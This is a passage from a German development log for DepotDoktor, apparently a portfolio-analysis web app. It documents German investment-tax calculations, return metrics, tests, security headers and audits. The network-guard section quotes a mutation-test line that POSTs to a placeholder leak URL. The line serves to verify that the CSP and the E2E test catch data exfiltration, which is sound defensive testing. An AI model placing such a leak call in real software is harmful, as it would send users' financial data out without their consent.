Die Werte „alt“ sind mit der vorherigen Implementierung nachgerechnet. Tests stehen in `volatility-drawdown.test.ts`, Abschnitt „Max Drawdown nach Vollverkauf“. Dazu kommt ein Durchlauf über `buildReport` mit vier Buchungen (Kauf 10 @ 100, Verkauf 10 @ 110, Kauf 5 @ 90, Kauf 1 @ 81): Drawdown 10 %, TTWROR −1 %.

### Steuerkonstanten geprüft

| Konstante | im Code | Quelle | Ergebnis |
|---|---|---|---|
| Basiszins 2025 | 2,53 % | BMF-Schreiben vom 10.01.2025, IV C 1 - S 1980/00230/009/002, BStBl I 2025, 273 (Wortlaut über die Haufe-Rechtsquellendatenbank) | stimmt |
| Basiszins 2026 | 3,20 % | BMF-Schreiben vom 13.01.2026, IV C 1 - S 1980/00230/012/001 (Haufe, Meldung „Basiszins zum 2.1.2026“) | stimmt |
| Teilfreistellung Aktienfonds | 30 % | § 20 Abs. 1 Satz 1 InvStG (gesetze-im-internet.de) | stimmt |
| Teilfreistellung Mischfonds | 15 % | § 20 Abs. 2 InvStG: Hälfte der Aktienteilfreistellung | stimmt |
| Teilfreistellung Immobilienfonds und Auslands-Immobilienfonds | 60 % und 80 % | § 20 Abs. 3 InvStG | stimmt |
| Sparer-Pauschbetrag | 1.000 € und 2.000 € | § 20 Abs. 9 Satz 1 und 2 EStG | stimmt |
| Zwölftelung, Zuflusszeitpunkt | 1/12 je vollem Monat vor dem Erwerbsmonat; Zufluss am ersten Werktag des Folgejahres | § 18 Abs. 2 und 3 InvStG | stimmt; seit 07.10.2026 wird nach Wortlaut die Vorabpauschale gekürzt („Zu verifizieren“, Punkt 1) |

Die Teilfreistellungssätze gelten für Anteile im Privatvermögen; die höheren Sätze für Betriebsvermögen bildet DepotDoktor nicht ab.

### Angesetzte Vorabpauschalen beim Verkauf

Rechtsgrundlage, am Gesetzestext geprüft: § 19 Abs. 1 Satz 3 InvStG („Der Gewinn ist um die während der Besitzzeit angesetzten Vorabpauschalen zu vermindern.“) und Satz 4 (in voller Höhe, ungeachtet der Teilfreistellung).

Umsetzung:

1. Je Verkauf im Steuerjahr gibt es im Steuerreiter ein optionales Feld „Für diese Anteile in Vorjahren angesetzte Vorabpauschalen (€, optional)“. Ohne Eingabe wird nichts abgezogen, das bisherige Ergebnis bleibt also gleich.
2. Das Feld erscheint nur, wenn der Fondstyp nicht „kein Fonds“ ist und der Verkauf nach FIFO mindestens eine Tranche aus einem früheren Kalenderjahr verbraucht. Begründung: Die Vorabpauschale eines Jahres gilt erst am ersten Werktag des Folgejahres als zugeflossen (§ 18 Abs. 3 InvStG). Anteile, die im selben Kalenderjahr gekauft und verkauft werden, können also keine angesetzte Vorabpauschale haben. Die Bedingung ist notwendig, nicht hinreichend; den Betrag liefert die Bank.
3. Gewinn = Erlös − Anschaffungskosten (FIFO) − angesetzte Vorabpauschalen. „Angesetzte Vorabpauschalen“ ist die Summe aus der Anrechnung je Tranche in `tax/fifo.ts` (derzeit immer 0, siehe unten) und dem eingetragenen Betrag. Angezeigt wird genau diese Summe, sodass Erlös − Anschaffungskosten − angezeigter Betrag immer den angezeigten Gewinn ergibt. Der Betrag wird nicht um die Teilfreistellung gekürzt. Unlesbare oder negative Eingaben werden als Fehler angezeigt und ziehen nichts ab.
4. Die Eingabe hängt an der Buchung des Verkaufs und liegt in einem eigenen Zustand, nicht in den Positionseinstellungen (Fondstyp, Kurse). Ein Wechsel des Steuerjahres überträgt sie deshalb nicht auf andere Verkäufe und ändert die Kursvorbelegung anderer Jahre nicht. Beim Laden einer neuen Datei werden die Eingaben verworfen.
5. Im PDF nennt die Fußnote der Position den Abzug und den geminderten Gewinn; die Kachel „Realisierte Gewinne“ enthält den Abzug.
6. Zugänglichkeit: Das Feld hat als Namen nur „Für diese Anteile in Vorjahren angesetzte Vorabpauschalen (€, optional)“ (`label` mit `for`). Hinweis und Fehlermeldung sind eigene Elemente mit `id` und hängen über `aria-describedby` am Feld; die Fehlermeldung nur, solange die Eingabe ungültig ist (`aria-invalid="true"`).

Handrechnung im Test `sale-credit.test.ts`: Kauf 10 @ 100 € am 03.03.2025, Kauf 10 @ 110 € am 02.02.2026, Verkauf 15 @ 120 € am 04.05.2026. FIFO: 10 × (120 − 100) + 5 × (120 − 110) = 250 €. Mit 12,34 € angesetzten Vorabpauschalen sind es 237,66 €. Weitere Fälle:

- leere Eingabe: 250 €
- 1.234,50 €: −984,50 €
- „abc“ und „−5“ sind ungültig: 250 €
- Fondstyp „kein Fonds“: kein Feld, 250 €
- Verkauf nur aus Anteilen desselben Jahres: kein Feld, 50 €
- Eingabe 12,34 € im Jahr 2026: Die Positionseinstellungen bleiben die Vorbelegung (seit 07.10.2026: 2025 Kurs 01.01. leer und 31.12. 100,00 €, 2026 Kurs 01.01. 100,00 € aus 2025 und 31.12. 120,00 € als Verkaufskurs)
- Anrechnung je Tranche 1,50 € × 10 Stück = 15,00 € plus Eingabe 12,34 €: angezeigt 27,34 €, Gewinn 1.800 − 1.550 − 27,34 = 222,66 €. Ohne gültige Eingabe (leer, „abc“, Fondstyp „kein Fonds“) bleiben 15,00 € und 250 − 15 = 235,00 €

E2E: Kauf 10 @ 100 € im Jahr 2025, Verkauf 10 @ 120 € im Jahr 2026. Geprüft werden:

- Die Eingabe von 25,30 € ergibt 174,70 € statt 200,00 € in der Verkaufszeile und in der Kachel „Realisierte Gewinne 2026 (FIFO)“; die Kachel wird über ihre eigene `data-testid` angesprochen.
- Nach dem Wechsel auf 2025 steht die Vorbelegung des Jahres 2025 in den Kursfeldern. Nach dem Wechsel zurück auf 2026 steht die Eingabe noch da.
- Zugänglicher Name und zugängliche Beschreibung des Felds.
- Ungültige Eingabe: Fehlermeldung in der Beschreibung, `aria-invalid`, Verkaufszeile und Kachel wieder bei 200,00 €.

Die Anrechnung je Tranche in `tax/fifo.ts` (`taxedVorabpauschalePerShare`) ist weiterhin 0, weil der Export keine Vorjahreskurse enthält. Rechnung und Anzeige verwenden die Summe beider Quellen (Punkt 3). Wird die Tranchen-Anrechnung künftig befüllt, etwa aus selbst geschätzten Vorabpauschalen der Vorjahre, beschreiben beide Quellen dieselbe Größe. Dann muss feststehen, welche Quelle gilt, damit derselbe Betrag nicht doppelt abgezogen wird; zum Beispiel ersetzt die Eingabe die Schätzung. Solange der Wert 0 ist, stellt sich die Frage nicht.

## Kurse je Steuerjahr 07.10.2026

Umgesetzt im Commit `b8a0c35` der öffentlichen Historie. Der Autor hat für den Bedienfehler aus „Damals nicht geändert, vom Autor zu entscheiden“, Punkt 5, Option (a) gewählt: Kurse je Steuerjahr und Position speichern, Fondstyp je Position behalten.

### Datenmodell

`apps/web/lib/depotdoktor/tax/inputs.ts`:

- `TaxInputs` hat zwei getrennte Teile: `fundTypes` (Schlüssel: Position) und `prices` (Schlüssel: Steuerjahr, darunter Position; die Felder `yearStartPrice` und `yearEndPrice` sind einzeln optional).
- `taxInputsReducer` kennt drei Aktionen: `setFundType` (Position, gilt für alle Jahre), `setPrice` (Jahr, Position, Feld, Wert) und `reset` (beim Laden einer neuen Datei und bei „Andere Datei“).
- Gespeichert wird nur, was eingegeben wurde, und zwar je Feld. `resolvePositionSettings` in `tax/summary.ts` setzt die Werte für ein Jahr zusammen: Fondstyp aus `fundTypes`, sonst der Standard nach Assetklasse; jedes Kursfeld aus `prices[Jahr][Position]`, sonst die Vorbelegung dieses Jahres (seit der Nachkontrolle: Kurs 01.01. aus dem Vorjahr, Kurs 31.12. bis zum Jahresende). Ein geleertes Feld bleibt leer und fällt nicht auf die Vorbelegung zurück; die Oberfläche fordert dann zur Eingabe auf.
- `buildTaxSummary(transactions, year, inputs, saleCredits)` nimmt diesen Zustand statt der bisherigen Positionseinstellungen entgegen. `TaxRow.settings` enthält die für das gewählte Jahr aufgelösten Werte; Steuerreiter und PDF lesen sie.
- Die Eingaben angesetzter Vorabpauschalen je Verkauf bleiben ein eigener Zustand (Schlüssel: Buchung des Verkaufs) und sind unverändert.

### Oberfläche und PDF

- Der Steuerreiter meldet Änderungen als Aktion. Das Jahr einer Kursaktion ist das Jahr der angezeigten Zusammenfassung, also das Jahr aus der Feldbeschriftung („Kurs 01.01.2026 (€)“).
- Der Hinweis unter „So wird gerechnet“ (auch im PDF) nennt die Vorbelegung; eingetragene Kurse gelten nur für das gewählte Steuerjahr, der Fondstyp gilt für alle Jahre.
- Die PDF-Fußnote je Position nennt das Jahr: „Kurs 01.01.2026: … € · Kurs 31.12.2026: … €“. Der PDF-Export nutzt wie die Ansicht die Zusammenfassung des gewählten Jahres.
- Die Kacheln Vorabpauschale, Steuerpflichtig und Geschätzte Steuer haben eigene `data-testid` (`tax-vorabpauschale`, `tax-taxable`, `tax-estimated-tax`) für den E2E-Test.

### Tests

Unit-Tests in `tax-inputs.test.ts`. Testdaten: Kauf 10 @ 100 € am 03.03.2025, Kauf 5 @ 110 € am 15.01.2026. Handrechnungen (Erwartungen nach der Nachkontrolle):

| Fall | Rechnung | Erwartung |
|---|---|---|
| ohne Eingabe | Vorbelegung: Kurs 01.01. = letzter Kurs bis 31.12. des Vorjahres, Kurs 31.12. = letzter Kurs bis Jahresende | 2025: leer / 100,00, keine Schätzung; 2026: 100,00 / 110,00, vorläufig 15 × 100 × 3,2 % × 0,7 = 33,60 € |
| 2026: 105 → 125, Aktienfonds | 10 × 105 × 3,2 % × 0,7 = 23,52; 5 × 105 × 3,2 % × 0,7 = 11,76 (Januarkauf, kein Monat entfällt); Wertzuwachs 15 × 20 = 300 deckelt nicht | Vorabpauschale 35,28 €, steuerpflichtig 35,28 × 0,7 = 24,696 €, Steuer 24,696 × 26,375 % = 6,51357 € |
| 2025: 01.01. eingegeben 100, 31.12. eingegeben 110, Aktienfonds | 10 × 100 × 2,53 % × 0,7 = 17,71; Kauf im März, 2 Monate entfallen: × 10/12 = 14,7583; Wertzuwachs 10 × 10 = 100 deckelt nicht | Vorabpauschale 14,7583 €, steuerpflichtig 10,3308 €, Steuer 2,7248 € |
| Fondstyp Mischfonds, Kurse wie oben | Teilfreistellung 15 % | 2026: steuerpflichtig 35,28 × 0,85 = 29,988 €, Steuer 7,909335 €; 2025: 12,5446 €, Steuer 3,3086 € |
| Verkauf 10 @ 120 € im Jahr 2026 aus Kauf 10 @ 100 € im Jahr 2025, angesetzte Vorabpauschalen 25,30 € | 10 × (120 − 100) − 25,30 | 174,70 € ohne Kurseingaben, mit Kurseingaben und mit Mischfonds |

Weitere Fälle: Kurse für 2026 ändern 2025 nicht; die Eingaben beider Jahre bleiben beim Wechsel erhalten, ein nicht eingegebenes Feld bleibt bei der Vorbelegung seines Jahres; der Fondstyp gilt für 2025 und 2026 und legt keinen Kurs fest; ein geleertes Feld bleibt leer (keine Schätzung), nur im betroffenen Jahr; Eingaben betreffen nur die eigene Position; der Reducer verändert den vorigen Zustand nicht, `reset` liefert den leeren Zustand; PDF-Fußnote und Kachel nennen die Kurse und Summen des gewählten Jahres.

E2E „Kurse im Steuerreiter gelten je Steuerjahr, der Fondstyp für alle Jahre, Andere Datei setzt beides zurück“ mit denselben zwei Käufen als Scalable-CSV (Stand nach der Nachkontrolle):

1. 2026: Felder 100,00 / 110,00 (vorläufig), Kacheln 33,60 €, 23,52 €, 6,20 € mit „vorläufig (Kurs aus dem Export)“.
2. Eingabe 105,00 / 125,00: Vorabpauschale 35,28 €, steuerpflichtig 24,70 €, Steuer 6,51 €.
3. Wechsel auf 2025: Felder leer / 100,00 (Vorbelegung 2025, nicht die Werte aus 2026), Kacheln „–“ mit „Kurse eintragen“.
4. Eingabe Kurs 01.01.2025 = 100,00 und Kurs 31.12.2025 = 110,00: 14,76 €, 10,33 €, 2,72 €.
5. Zurück auf 2026: Felder 105,00 / 125,00, Kacheln 35,28 €, 24,70 €, 6,51 €.
6. Fondstyp Mischfonds: 35,28 €, 29,99 €, 7,91 €.
7. Wechsel auf 2025: Fondstyp Mischfonds, Felder 100,00 / 110,00, Kacheln 14,76 €, 12,54 €, 3,31 €.
8. „Andere Datei“, dieselbe Datei erneut laden, Steuerreiter: 2026 Fondstyp Aktienfonds, Felder 100,00 / 110,00, vorläufig 33,60 €; 2025 Fondstyp Aktienfonds, Felder leer / 100,00, „–“. Das sind die Vorbelegungen aus Schritt 1 und 3.

Die Kacheln werden über ihre `data-testid` angesprochen und auf Beschriftung und Betrag am Anfang der Kachel geprüft, damit etwa „10,00 €“ nicht als „0,00 €“ durchgeht.

Der E2E-Test „Angesetzte Vorabpauschalen mindern den Veräußerungsgewinn, Andere Datei setzt sie zurück“ prüft dasselbe für die Eingabe je Verkauf: nach 25,30 € (Gewinn 174,70 €), „Andere Datei“ und erneutem Laden ist das Feld leer und der Gewinn wieder 10 × (120 − 100) = 200,00 €. Die Buchungsschlüssel (`sc-<Zeile>`) sind bei derselben Datei gleich, eine vergessene Rücksetzung würde den alten Betrag also wieder abziehen.

Zurückgesetzt wird an zwei Stellen in `DepotDoktorApp.tsx`: in `reset` („Andere Datei“) und in `loadText`. Das Dateifeld gibt es nur in der Ansicht ohne Report, und aus dem Report führt nur „Andere Datei“ dorthin. Eine zweite Datei lässt sich also nicht laden, ohne vorher `reset` auszulösen; die Rücksetzung in `loadText` ist über die Oberfläche nicht getrennt beobachtbar und bleibt als Absicherung stehen. Mutationsprüfung in einer Kopie außerhalb des Repos (nur die beiden E2E-Tests mit „Andere Datei“, ohne Wiederholungen, `next build` und `next start`):

| Mutation | Ergebnis |
|---|---|
| unverändert | grün |
| Rücksetzung der Steuereingaben in `reset` und `loadText` entfernt | rot: Fondstyp „mixed“ statt „equity“ |
| nur in `reset` entfernt | grün (`loadText` setzt zurück) |
| nur in `loadText` entfernt | grün (`reset` setzt zurück) |
| `setSaleCredits({})` in `reset` und `loadText` entfernt | rot: Feld zeigt „25,30“ statt leer |

## Sicherheit

Antwort-Header aus `apps/web/next.config.ts` (Stand 07.10.2026): Content-Security-Policy mit `default-src 'self'`, `script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'` (in der Entwicklung zusätzlich `'unsafe-eval'` für das Hot Reloading von Next.js, in Produktion nicht), `connect-src 'self' data:`, `object-src 'none'`, `frame-ancestors 'none'`; dazu X-Content-Type-Options, X-Frame-Options `DENY`, Referrer-Policy, Permissions-Policy `camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()` (statt des veralteten `interest-cohort=()`, gleich in K1, K2 und K3), Strict-Transport-Security mit `max-age=63072000` und Cross-Origin-Opener-Policy `same-origin`.

Entscheidung zur CSP (07.10.2026): keine Nonce-CSP, sie würde alle Seiten dynamisch machen. script-src enthält unsafe-inline, weil Next.js beim statischen Prerendering Inline-Skripte erzeugt; die Seite rendert keine Nutzereingaben ins DOM, Risiko gering; wasm-unsafe-eval für den PDF-Renderer.

## Nachkontrolle 07.10.2026

Umsetzung der Befunde einer externen Nachkontrolle von Live-Seite, Repository und Inhalt. Für jede fachliche Änderung steht unten die Rechtsgrundlage, die Handrechnung und der Unterschied alt/neu. Alle Zahlen „neu“ sind durch Unit-Tests mit ausgeschriebener Rechnung abgesichert; die Werte „alt“ sind mit der vorherigen Implementierung nachgerechnet.

### Ausschüttungen brutto (§ 2 Abs. 11 InvStG)

Rechtsgrundlage: § 2 Abs. 11 InvStG definiert Ausschüttungen als die dem Anleger gezahlten oder gutgeschriebenen Beträge einschließlich des Steuerabzugs auf den Kapitalertrag. § 18 Abs. 1 InvStG zieht diese Ausschüttungen vom Basisertrag ab.

Bisher summierte `tax/positions.ts` je Ausschüttung nur `|amount|`. DepotDoktor behandelt `amount` als Nettobetrag (die Kachel heißt „Dividenden netto“), der Steuerabzug steht in der Spalte `tax`. Neu: `|amount| + |tax|`. Steuerreiter und PDF nennen den Betrag „Ausschüttungen <Jahr> (brutto, vor Steuerabzug)“, bei Fondstyp „kein Fonds“ „Dividenden <Jahr> (brutto, vor Steuerabzug)“ ohne den Zusatz „mindern den Basisertrag“.

| Fall | alt | neu | Handrechnung neu |
|---|---|---|---|
| Basisertrag 224,00 €, Ausschüttung netto 122,31 € mit 27,69 € Steuerabzug, Wertzuwachs über 224 € | 224,00 − 122,31 = 101,69 € | 74,00 € | 100 × 100 × 3,2 % × 0,7 = 224,00; brutto 122,31 + 27,69 = 150,00; 224,00 − 150,00 = 74,00 |
| dieselbe Ausschüttung ohne Steuerabzug (150,00 €) | 74,00 € | 74,00 € | unverändert |
| Dividende Musterwerk AG in der Trade-Republic-Testdatei (18,50 € netto, 6,50 € Steuer) | 18,50 € | 25,00 € | Aktie, keine Vorabpauschale; nur die Anzeige ändert sich |

Tests: `distributions.test.ts` (auch Steuerabzug mit negativem Vorzeichen und Ausschüttung eines anderen Jahres), `positions.test.ts`. Offener Prüfpunkt: „Zu verifizieren an echten Exporten“, Punkt 6.

Reihenfolge Ausschüttung und Deckel, zur README-Formel: Basisertrag 224 €, Wertzuwachs 150 €, Ausschüttungen 100 € ergibt min(224 − 100, 150) = 124,00 € (Test in `distributions.test.ts`). Das entspricht § 18 Abs. 1 Satz 1 und 3 InvStG: Der Basisertrag ist höchstens der Mehrbetrag aus Wertzuwachs plus Ausschüttungen, die Vorabpauschale ist der Betrag, um den die Ausschüttungen den Basisertrag unterschreiten.

### Zwölftelung im Erwerbsjahr (§ 18 Abs. 2 InvStG)

Rechtsgrundlage: § 18 Abs. 2 InvStG, „Im Jahr des Erwerbs der Investmentanteile vermindert sich die Vorabpauschale um ein Zwölftel für jeden vollen Monat, der dem Monat des Erwerbs vorangeht.“ Gekürzt wird also die Vorabpauschale nach Abzug der Ausschüttungen und nach dem Deckel, nicht der Basisertrag.

Standard in `tax/vorabpauschale.ts` jetzt `reductionTarget: "vorabpauschale"`. Die Formel lautet für einen Kauf im Monat m: (min(Basisertrag − Ausschüttungen, Wertzuwachs), nie unter 0) × (13 − m)/12.

| Fall (Kauf im Juli, 6 Monate entfallen, Basis 10.000 €, Basiszins 3,2 %) | alt (Basisertrag gekürzt) | neu (Vorabpauschale gekürzt) | Handrechnung neu |
|---|---|---|---|
| Wertzuwachs 1.500 € | 112,00 € | 112,00 € | min(224, 1.500) × 6/12 = 112,00 |
| Wertzuwachs 150 € (Deckel greift) | 112,00 € | 75,00 € | min(224, 150) × 6/12 = 75,00; steuerpflichtig 52,50 €, Steuer 13,85 € |
| Wertzuwachs 1.500 €, Ausschüttungen 100 € | (112 − 100) = 12,00 € | 62,00 € | (224 − 100) × 6/12 = 62,00 |
| Testfall „über Jahresgrenze“ (`positions.test.ts`): Bestand 15 @ 90 → 100, Kauf 10 Anteile am 15.07.2026 | Basisertrag 10,08 €, Vorabpauschale 10,08 € | Basisertrag 20,16 €, Vorabpauschale 10,08 € | 10 × 90 × 3,2 % × 0,7 = 20,16; × 6/12 = 10,08; Zuwachs deckelt nicht, Ergebnis gleich |

Die Variante „basisertrag“ ist weiter getestet (112,00 € bei 150 € Zuwachs). Texte in Steuerreiter, PDF und README: „Bei Kauf im Jahr wird die Vorabpauschale um 1/12 je vollen Monat vor dem Kaufmonat gekürzt (§ 18 Abs. 2 InvStG).“

### TTWROR: Zufluss in ein leeres Depot zu Periodenbeginn

Konvention: Zuflüsse werden zu Periodenbeginn angesetzt, wenn die Periode ohne Bestand beginnt (erster Kauf, Kauf nach Vollverkauf); auch die Gebühr des ersten Kaufs mindert die TTWROR. Bisher wurde eine Periode mit Startwert 0 übersprungen, die Kaufgebühr des ersten Kaufs (Zufluss 8.001 €, Wert 8.000 €) ging nicht ein, die Gebühr jedes späteren Kaufs aber schon. Neu in `metrics/ttwror.ts`: Periodenrendite = Endwert / Zufluss − 1 für eine Periode mit Startwert 0 und Zufluss > 0. Max Drawdown (`metrics/drawdown.ts`) verkettet dieselben Perioden.

| Kennzahl, Trade-Republic-Testdatei | alt | neu | Handrechnung neu |
|---|---|---|---|
| TTWROR | 2,4084 % (+2,41 %) | 2,3956 % (+2,40 %) | 8000/8001 × 7999/8000 × 9018,5/9000 × 9199/9000 − 1 |
| Max Drawdown | 0,0125 % (−0,01 %) | 0,0250 % (−0,02 %) | 1 − 8000/8001 × 7999/8000 = 1 − 7999/8001, Hoch 06.01., Tief 10.02. |
| TTWROR Scalable-Testdatei | 2,4086 % (+2,41 %) | 2,3960 % (+2,40 %) | 8000/8000,99 × 7999,01/8000 × 9018,5/9000 × 9199,01/9000 − 1 |
| Kauf nach Vollverkauf (1001 → 1100, 501 → 500, Zukauf 110 → 660) | 1100/1000 × 550/500 − 1 = 21,00 % | 20,64 % | 1000/1001 × 1100/1000 × 500/501 × 550/500 − 1 |

### Bewertungspunkte nur an Depotbuchungen

Bisher wurde jeder Buchungstag ein Bewertungspunkt, auch Einzahlung, Zinsen, Kartenzahlung und eine Einbuchung ohne ISIN. Das widersprach der Entscheidung „Kontobuchungen fließen nicht ein“ (oben, Punkt 1): Kontobuchungen bestimmten Zeitraum und Endzeitpunkt des IRR, und die 0-%-Perioden an Kontotagen drückten die Volatilität. Neu in `portfolio.ts`: Bewertungspunkte nur an Tagen mit Kauf, Verkauf, Ausschüttung oder Gebühr, Steuer bzw. Einbuchung mit ISIN; Gebühren und Steuern ohne ISIN sind keine Depot-Zahlungsströme mehr. Der Zeitraum beginnt am ersten Kauf und endet an der letzten Depotbuchung. Die Kontokennzahlen (Einzahlungen 10.000 €, Zinsen 3,21 €) bleiben unverändert. Die IRR-Kachel nennt „bewertet zum letzten Kurs im Export, Stand <Datum>“, darunter steht „Der IRR p. a. hängt vom Endzeitpunkt ab.“

| Kennzahl | alt Trade Republic | alt Scalable | neu (beide) | Handrechnung neu |
|---|---|---|---|---|
| Zeitraum | 05.01.–02.08.2026 | 05.01.–01.07.2026 | 06.01.–20.06.2026 | erster Kauf bis Verkauf |
| Bewertungspunkte | 8 | 6 | 4 | 06.01., 10.02., 15.03., 20.06. |
| IRR p. a. | 4,38 % | 5,17 % | 5,51 % (TR 5,5125 %, Scalable 5,5133 %) | Zahlungsströme −8.001 (Tag 0), −1.001 (Tag 35), +18,50 (Tag 68), +479 und Endwert 8.720 (Tag 165); Tage/365 |
| Volatilität p. a. | 1,90 % | 2,06 % | 2,32 % | drei Perioden mit 35, 33 und 97 Tagen, je Rendite/√(Tage × 252/365), Stichproben-Standardabweichung × √252 |

Test: `portfolio.test.ts` (gleicher Zeitraum beider Testdateien, IRR-Abweichung höchstens 0,01 Prozentpunkte).

### TTWROR und IRR gekennzeichnet

Unter einem Jahr heißt die Kachel „TTWROR (kumuliert)“ mit „nicht annualisiert, Zeitraum unter 1 Jahr“, ab einem Jahr „TTWROR (p. a.)“ mit dem kumulierten Wert im Hinweis. Die IRR-Kachel heißt „IRR (geldgewichtet, p. a.)“. Darunter steht: „Die TTWROR misst die Wertentwicklung unabhängig davon, wann Sie Geld investiert haben; der IRR berücksichtigt Zeitpunkt und Höhe Ihrer Käufe und Verkäufe.“ Ansicht und PDF nutzen dieselbe Quelle (`lib/depotdoktor/kpis.ts`).

### Steuerreiter ohne Schein-Ergebnis

Bisher waren Kurs 01.01. und Kurs 31.12. mit demselben letzten Kurs bis Jahresende vorbelegt, die Kacheln zeigten ohne Eingabe 0,00 €, und der Kurs 01.01. konnte aus dem laufenden Jahr stammen. Neu:

- Kurs 01.01. eines Jahres J nur aus dem letzten Kurs mit Datum ≤ 31.12.(J−1), sonst leer; Kurs 31.12. nur aus Kursen ≤ 31.12.J.
- Fehlt ein Kurs oder stammen beide unverändert aus derselben Buchung, zeigen die drei Steuerkacheln und das PDF „–“ mit „Kurse eintragen“ statt 0,00 €. Seit der Nachbesserung gilt das nicht für Positionen ohne Bestand am 31.12.; sie brauchen keine Kurse (Abschnitt „Nachbesserung 07.10.2026“).
- Vorbelegte, unveränderte Kurse tragen das Etikett „vorläufig (Kurs aus dem Export)“, ebenso die Kacheln, solange ein Wert vorbelegt ist.
- Die Option heißt „Kein Fonds (Aktie, Anleihe)“; „keine Vorabpauschale“ steht im Hinweis darunter.

| Fall | alt | neu |
|---|---|---|
| Beispieldatei 2026, ETF gekauft am 06.01.2026 | Kurse 80,00 / 80,00, Kacheln 0,00 € | Kurs 01.01. leer, Kacheln „–“ und „Kurse eintragen“ |
| Kauf 03.03.2025 @ 100, Kauf 15.01.2026 @ 110, Jahr 2026 | 110,00 / 110,00, 0,00 € | 100,00 / 110,00 vorläufig, 33,60 €, steuerpflichtig 23,52 €, Steuer 6,20 € |
| dieselbe Datei, Jahr 2025 | 100,00 / 100,00, 0,00 € | leer / 100,00, „–“ |
| nur Kauf 03.03.2025 @ 100, Jahr 2026 | 100,00 / 100,00, 0,00 € | beide aus derselben Buchung, „–“ |

Handrechnung vorläufig 2026: 10 × 100 × 3,2 % × 0,7 = 22,40 plus 5 × 100 × 3,2 % × 0,7 = 11,20, zusammen 33,60; × 0,7 = 23,52; × 26,375 % = 6,2034. Tests: `tax-prefill.test.ts`, `tax-inputs.test.ts`, `sale-credit.test.ts`.

### Beispieldatei

Die Beispieldatei ist jetzt die synthetische Trade-Republic-Datei (byte-gleich mit `packages/csv/fixtures/traderepublic-synthetic.csv`, 8 Zeilen, keine übersprungen) statt der Scalable-Datei (7 Zeilen, 1 übersprungen). Sie liefert Assetklassen: Musterwerk AG ist automatisch „Kein Fonds“, die Allokation zeigt ETF und Aktien statt 100 % „Nicht zugeordnet“. Beim Scalable-Upload erscheinen die Hinweise zu Fondstyp und Assetklasse.

### PDF-Report

Zwölf Kennzahlen in drei Reihen (neu: Gebühren, Abgeführte Steuern, Einzahlungen Konto, Zinsen Konto), Erklärsatz unter den Kennzahlen, „n übersprungen“ in der Quellzeile, Hinweise beim Einlesen unter „Hinweise zur Berechnung“, Kurzköpfe „Vorabpausch.“ und „Steuerpfl.“ mit Innenabstand in der Steuertabelle, Fußzeile „Erstellt mit DepotDoktor · depotdoktor.vercel.app/projects/depotdoktor“ auf jeder Seite (Adresse aus `apps/web/lib/site.ts`).

Bekannt, nicht behoben (offen): Die Seitenzahl „Seite x von y“ unten rechts erscheint im PDF nicht, weder im Textauszug noch im gerenderten Seitenbild. Das war schon vor der Nachkontrolle so (geprüft mit der vorherigen `ReportDocument.tsx`); die `render`-Funktion von @react-pdf/renderer 4.9 mit @react-pdf/layout 5.2 liefert hier keinen Text. Ein Versuch mit fester Breite und mit `View` statt `Text` änderte nichts. Die übrigen Fußzeilen (Disclaimer, „Erstellt mit DepotDoktor · …“) stehen auf jeder Seite.

### Netzwerk-Wächter

Der E2E-Test „Beispieldatei: Report mit allen Kennzahlen, kein Upload“ sammelt nach dem Laden der Seite jede Anfrage. Erlaubt sind nur GET-Anfragen an denselben Origin (aus `baseURL`, Port über `PORT`) mit Pfad `/_next/static/` oder Parameter `_rsc`; keine Anfrage darf Inhalte der Datei (ISIN, Positionsnamen) in URL oder Body tragen. Geprüft wird nach Beispieldatei, allen vier Reitern, PDF- und CSV-Export. Mutationsprüfung am 07.10.2026: Ein testweise eingebautes `fetch("https://example.org/leak", { method: "POST" })` blockiert die CSP, bevor eine Anfrage entsteht; Playwright meldet sie deshalb weder als `request` noch als `requestfailed`. Der Test sammelt darum zusätzlich `securitypolicyviolation`-Ereignisse und Konsolenfehler; mit der Mutation schlug er fehl („connect-src https://example.org/leak“), ohne sie ist er grün.

### README-Screenshots

`docs/screenshots/performance.png` und `steuer.png` sind neu erzeugt: Playwright gegen `next start` (Port 3101), Viewport 1280 px, Skalierung 1,5, Beispieldatei (Trade-Republic-Testdatei), im Steuerreiter Beispielkurse für den ETF (Kurs 01.01.2026: 80,00 €, Kurs 31.12.2026: 95,00 €). Die Kacheln haben jetzt Innenabstand (Tailwind-Klassen aus `packages/` werden gescannt), die Werte entsprechen den E2E-Erwartungen.

### Abhängigkeiten und Audit

`next` und `eslint-config-next` 15.5.27, `react` und `react-dom` 19.3.0, `@playwright/test` 1.63.0. Overrides: `postcss >=8.5.23`, `sharp >=0.35.5`, `source-map-js >=1.2.2`, `brace-expansion@1 ^1.1.21`, `brace-expansion@5 ^5.0.12`; `braces` hat laut Advisory keinen Patch und wird nicht überschrieben. `pnpm.onlyBuiltDependencies` erlaubt nur `esbuild` und `unrs-resolver`. Ergebnis: pnpm audit: nur braces über eslint-config-next (Dev, ohne Patch); `pnpm audit --prod` meldet 0.

### Prüfergebnisse der Nachkontrolle

Lokal unter Windows 11 mit Node 22.23.2, pnpm 10.34.5 und Chromium Headless Shell 1234, E2E mit `CI=true` gegen `next start`.

| Schritt | Ergebnis |
|---|---|
| `pnpm install --frozen-lockfile` | grün |
| `pnpm typecheck` (einschließlich E2E-Dateien) | grün |
| `pnpm lint` (alle sechs Pakete) | grün |
| `pnpm test` | vorher 168 Tests grün (csv 50, pdf 1, web 117) und 1 offener `todo`; jetzt 223 Tests grün (csv 50, pdf 2, web 171) und 1 offener `todo` |
| `pnpm build` | grün |
| `pnpm test:e2e` mit `CI=true` und `PORT=3101` | vorher 11 Tests grün; jetzt 28 Tests grün (`depotdoktor.spec.ts` 14, `site.spec.ts` 14) |
| axe-core (WCAG 2.2 AA und Best Practices) bei 390, 768 und 1280 px: Startseite, Projektseite ohne Datei und mit Beispieldatei in allen vier Reitern, drei Rechtsseiten, 404 | 0 Verstöße |

## Nachbesserung 07.10.2026

